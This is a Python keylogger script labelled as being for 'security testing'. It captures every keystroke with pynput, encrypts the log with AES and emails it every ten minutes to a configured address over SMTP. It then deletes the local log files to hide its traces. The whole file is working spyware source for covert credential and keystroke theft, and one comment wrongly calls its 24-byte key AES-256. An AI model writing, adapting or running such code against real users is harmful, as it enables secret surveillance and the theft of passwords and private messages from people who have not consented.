import logging
import os
import time
from datetime import datetime
from threading import Timer
from pynput import keyboard
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Configuration for logging and encryption
log_file = "key_log.txt"
encrypted_log_file = "encrypted_key_log.bin"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
encryption_key = b"thisisaverysecurekey123!"  # 24-byte key for AES-256 encryption
report_interval = 600  # 10 minutes in seconds

# Email configuration
sender_email = "your_email@example.com"
receiver_email = "receiver_email@example.com"
password = "your_password"
smtp_server = "smtp.example.com"  # Update with your SMTP server
smtp_port = 465  # Standard port for SMTP over SSL

def encrypt_file(input_file, output_file, key):
    """Encrypts a file using AES encryption."""
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    with open(input_file, 'rb') as f:
        plaintext = f.read()
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    
    with open(output_file, 'wb') as ef:
        ef.write(iv + ciphertext)  # Prepend IV for decryption
    
    print("Log file encrypted successfully.")

def email_log_file():
    """Encrypts, emails, and deletes the log file."""
    try:
        # Encrypt the log file before sending
        encrypt_file(log_file, encrypted_log_file, encryption_key)
        
        # Set up email message
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = "Encrypted Keystroke Log for Security Testing"
        
        # Attach encrypted file
        with open(encrypted_log_file, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={encrypted_log_file}")
        msg.attach(part)
        
        # Send email with encrypted log file
        with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
            server.login(sender_email, password)
            server.send_message(msg)
            print("Encrypted log file emailed successfully for analysis.")
        
        # Cleanup log files
        os.remove(log_file)
        os.remove(encrypted_log_file)
        print("Log files cleaned up after emailing.")
    
    except Exception as e:
        print("Error during email and cleanup:", e)

def schedule_reporting():
    """Schedules the email_log_file function to run every 10 minutes."""
    email_log_file()
    Timer(report_interval, schedule_reporting).start()

def on_press(key):
    """Callback function to log each key press."""
    try:
        logging.info(str(key.char))  # Log character keys
    except AttributeError:
        logging.info(str(key))  # Log special keys like Enter, Shift, etc.

# Start keylogging and reporting
print("Starting controlled keylogger for security testing...")
with keyboard.Listener(on_press=on_press) as listener:
    # Start scheduled reporting
    schedule_reporting()
    listener.join()
